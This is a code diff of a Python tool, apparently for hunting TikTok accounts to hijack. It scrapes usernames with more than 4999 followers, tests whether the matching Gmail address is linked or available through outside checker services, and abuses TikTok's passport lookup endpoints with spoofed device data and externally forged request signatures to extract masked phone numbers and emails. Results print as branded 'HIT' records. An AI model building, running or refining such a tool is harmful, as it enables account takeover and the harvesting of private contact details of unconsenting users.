@@ -10,9 +10,13 @@ from user_agent import generate_user_agent
 from random import choice,randrange
 from requests import get
 import urllib.parse
-import re
-
-import json , random,uuid
+import binascii
+import uuid
+import random
+import json
+import secrets
+from urllib.parse import urlencode
+import uuid
 
 
 class qredes:
@@ -34,14 +38,14 @@ class qredes:
     os.system('clear' if os.name == 'posix' else 'cls')
     self.id='5450121337'
     os.system('clear' if os.name == 'posix' else 'cls')
-    for _ in range(200):
+    for _ in range(100):
       Thread(target=self.home).start()
   def check_text(self,text):
         return bool(re.search(r'[^a-zA-Z0-9.]', text))
   def search1(self,keyword):
         data = {
             'keyword': urllib.parse.quote(keyword),
-        };url='https://serach-87386387-c4f829101c07.herokuapp.com/'
+        };url=choice(['https://chhp-562f83153fb3.herokuapp.com/','https://serach-87386387-c4f829101c07.herokuapp.com/'])
         while True:
             try:
                 try:
@@ -53,7 +57,7 @@ class qredes:
                             self.cok.append(response['cookies'])
                             return response['response']
                         except Exception as e:''
-                for _ in range(5):
+                for _ in range(3):
                     try:
                         response=requests.get(url,data=data,cookies=cookies).json()
                         self.cok.append(response['cookies'])
@@ -72,38 +76,19 @@ class qredes:
       try:
         g=choice(
             [
-                'azertyuiopmlkjhgfdsqwxcvbn', 
                 'azertyuiopmlkjhgfdsqwxcvbn',
-                'azertyuiopmlkjhgfdsqwxcvbn',
-                'azertyuiopmlkjhgfdsqwxcvbn',
-                'azertyuiopmlkjhgfdsqwxcvbn',
-                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  
                 'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
-                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
-                'abcdefghijklmnopqrstuvwxyzñ',  
                 'abcdefghijklmnopqrstuvwxyzñ',
-                'abcdefghijklmnopqrstuvwxyzñ',
-                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  
                 'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
-                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
-                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
                 '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
-                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
-                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  
                 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                 'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
-                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
-                'אבגדהוזחטיכלמנסעפצקרשת',
                 'אבגדהוזחטיכלמנסעפצקרשת',
                 'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                 'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
-                'αβγδεζηθικλμνξοπρστυφχψω',  
                 'αβγδεζηθικλμνξοπρστυφχψω',
                 'abcdefghijklmnopqrstuvwxyzç', 
-                'abcdefghijklmnopqrstuvwxyzç',
-                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',  
                 'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
-                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
                 'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
             ]
 
@@ -118,8 +103,7 @@ class qredes:
                 for users in self.search1(keyword)['user_list']:
                     username=users['user_info']['unique_id']
                     follower_count=users['user_info']['follower_count']
-                    if 3999 < follower_count:
-                        if '_' not in username:
+                    if 4999 < follower_count:
                             if username not in self.list:
                                 if 5 < len(username):
                                     if self.check_text(username) == False:
@@ -286,7 +270,8 @@ class qredes:
   def check_linked(self,email):
         while True:
           try:
-              res = requests.get('https://api-chk-c6c74207545b.herokuapp.com/?email={}'.format(email)).json()['status']
+              u=choice(['https://tikk-chkk-43704f860670.herokuapp.com/','https://api-chk-c6c74207545b.herokuapp.com/'])
+              res = requests.get(u+'?email={}'.format(email)).json()['status']
               if True == res:
                   return True
               else:
@@ -448,17 +433,27 @@ class qredes:
         except Exception as e:''
   def info(self,username):
     try:
-      if username in self.hits:
-        return
+      try:
+          if username in open('usernames.txt','r').read().splitlines():
+              return
+          with open('usernames.txt','a') as a:
+                a.write(f'{username}\n')
+      except:
+          with open('usernames.txt','a') as a:
+                a.write(f'{username}\n')
       self.hits.append(username)
       inf=self.information(username)
+      mn=self.em_num(username)
       ff = (f'''
 
-   new account tiktok 
-
-    𝙽𝙰𝙼𝙴 : {inf['name']}
+    𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
+    ═══════════════════
+    𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @d_dwu | @Qredes
+    ═══════════════════
     𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {username}
     𝙶𝙼𝙰𝙸𝙻 : {username}@gmail.com
+    number : {mn['number']}
+    email : {mn['email']}
     𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {inf['followers']}
     𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {inf['following']}
     𝙻𝙸𝙺𝙴 : {inf['like']}
@@ -467,9 +462,10 @@ class qredes:
     𝚅𝙴𝙳𝙾 : {inf['video']}
     𝙲𝙾𝚄𝙽𝚃𝚁𝚈 𝙽𝙰𝙼𝙴 : {inf['country_name']}
     𝙵𝙻𝙰𝙶 : {inf['flag']}
+    𝙽𝙰𝙼𝙴 : {inf['name']}
     𝙱𝙸𝙾 : {inf['bio']}
-    em_num : {self.em_num(username)}
-
+    ═══════════════════
+متاح ممكن صح ممكن غلط
      ''')
     except:
       ff=f'''
@@ -480,7 +476,8 @@ class qredes:
       ═══════════════════
       𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {username}
       𝙶𝙼𝙰𝙸𝙻 : {username}@gmail.com
-      em_num : {self.em_num(username)}
+      number : {mn['number']}
+      email : {mn['email']}
       ═══════════════════
 
       '''
@@ -500,23 +497,105 @@ class qredes:
       except:
           return '',''
   def em_num(self,user):
-        try:
-                session = requests.Session()
-                url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/username/"
-                params = {  "request_tag_from": "h5",  "fixed_mix_mode": "1",  "mix_mode": "1",  "account_param":user,  "scene": "4",  "device_platform": "android",  "os": "android",  "ssmix": "a",      '_rticket': "4632",    'cdid': str(uuid.uuid4()),  "channel": "googleplay",  "aid": "1233",  "app_name": "musical_ly",  "version_code": "360505",  "version_name": "36.5.5",  "manifest_version_code": "2023605050",  "update_version_code": "2023605050",  "ab_version": "36.5.5",  "resolution": "1440*2969",  "dpi": "532",  "device_type": "SM-S928B",  "device_brand": "samsung",  "language": "ar",  "os_api": "34",  "os_version": "14",  "ac": "wifi",  "is_pad": "0",  "current_region": "IQ",  "app_type": "normal",  "sys_region": "AE",  "last_install_time": "1729289943",  "mcc_mnc": "41820",  "timezone_name": "Asia/Baghdad",  "carrier_region_v2": "418",  "residence": "IQ",  "app_language": "ar",  "carrier_region": "IQ",  "timezone_offset": "10800",  "host_abi": "arm64-v8a",  "locale": "ar",  "ac2": "wifi",  "uoo": "0",  "op_region": "IQ",  "build_number": "36.5.5",  "region": "AE",    'iid': str(random.randint(1, 1019)),    'device_id': str(random.randint(1, 1019)),  "support_webview": "1",  "cronet_version": "1c651b66_2024-08-30",  "ttnet_version": "4.2.195.8-tiktok",  "use_store_region_cookie": "1"}
-                headers = {  'User-Agent': "com.zhiliaoapp.musically/2023605050 (Linux; U; Android 14; ar; SM-S928B; Build/UP1A.231005.007; Cronet/TTNetVersion:1c651b66 2024-08-30 QuicVersion:182d68c8 2024-05-28)",  'Accept': "application/json, text/plain, */*",  'content-type': "application/x-www-form-urlencoded", }
-                response = session.post(url, params=params, headers=headers)
-                passport_ticket = response.json()["data"]["accounts"][0]["passport_ticket"]
-                url = "https://api22-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/"
-                for key in ['mix_mode', 'account_param', 'fixed_mix_mode']:
-                        params.pop(key, None)
-                params['passport_ticket'] = passport_ticket
-                response = requests.post(url, params=params, headers=headers)
-                data = json.loads(response.headers.get("x-tt-verify-idv-decision-conf"))
-                masked_accounts = [item['masked_account'] for item in data['extra']]
-                return masked_accounts
-        except:
-                return ['','']
+      try:
+        secret = secrets.token_hex(16)
+        cookies ={
+      "passport_csrf_token": secret,
+      "passport_csrf_token_default": secret
+    }
+        session = requests.Session()
+        session.cookies.update(cookies)
+        url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/username/"
+        params = {
+      "request_tag_from": "h5",
+      "fixed_mix_mode": "1",
+      "mix_mode": "1",
+      "account_param":user,
+      "scene": "4",
+      "device_platform": "android",
+      "os": "android",
+      "ssmix": "a",
+          '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
+        'cdid': str(uuid.uuid4()),
+      "channel": "googleplay",
+      "aid": "1233",
+      "app_name": "musical_ly",
+      "version_code": "360505",
+      "version_name": "36.5.5",
+      "manifest_version_code": "2023605050",
+      "update_version_code": "2023605050",
+      "ab_version": "36.5.5",
+      "resolution": "1440*2969",
+      "dpi": "532",
+      "device_type": "SM-S928B",
+      "device_brand": "samsung",
+      "language": "EN",
+      "os_api": "34",
+      "os_version": "14",
+      "ac": "wifi",
+      "is_pad": "0",
+      "current_region": "US",
+      "app_type": "normal",
+      "sys_region": "US",
+      "last_install_time": "1729289943",
+      "mcc_mnc": "41820",
+      "timezone_name": "Asia/Baghdad",
+      "carrier_region_v2": "418",
+      "residence": "US",
+      "app_language": "en",
+      "carrier_region": "US",
+      "timezone_offset": "10800",
+      "host_abi": "arm64-v8a",
+      "locale": "ar",
+      "ac2": "wifi",
+      "uoo": "0",
+      "op_region": "US",
+      "build_number": "36.5.5",
+      "region": "US",
+      'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
+        'iid': str(random.randint(1, 10**19)),
+        'device_id': str(random.randint(1, 10**19)),
+        'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
+
+      "support_webview": "1",
+      "cronet_version": "1c651b66_2024-08-30",
+      "ttnet_version": "4.2.195.8-tiktok",
+      "use_store_region_cookie": "1"
+    }
+        m=requests.get('https://x-args-9280e029f5ca.herokuapp.com/',params={'params':urlencode(params)}).json()
+        headers = {
+      'User-Agent': "com.zhiliaoapp.musically/2023605050 (Linux; U; Android 14; ar; SM-S928B; Build/UP1A.231005.007; Cronet/TTNetVersion:1c651b66 2024-08-30 QuicVersion:182d68c8 2024-05-28)",
+      'Accept': "application/json, text/plain, */*",
+      'x-tt-passport-csrf-token': secret,
+      'content-type': "application/x-www-form-urlencoded",
+      'x-argus': m["x-argus"],  'x-gorgon':m["x-gorgon"],'x-khronos': m["x-khronos"],'x-ladon':m["x-ladon"],
+    }
+        response = session.post(url, params=params, headers=headers)
+        passport_ticket = response.json()["data"]["accounts"][0]["passport_ticket"]
+        url = "https://api22-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/"
+        for key in ['mix_mode', 'account_param', 'fixed_mix_mode']:
+          params.pop(key, None)
+        params['passport_ticket'] = passport_ticket
+        response = session.post(url, params=params, headers=headers)
+        hh=json.loads(response.headers["x-tt-verify-idv-decision-conf"])
+        g={
+          'number':'',
+          'email':''
+        }
+        for en in hh['extra']:
+          if '+' in en['masked_account']:
+            g.update({'number':en['masked_account']})
+          elif '@' in en['masked_account']:
+            g.update({'email':en['masked_account']})
+
+        return g
+      except Exception as e:
+        return {
+          'number':'',
+          'email':''
+        }
+
+
 
   def information(self,username):
     try:
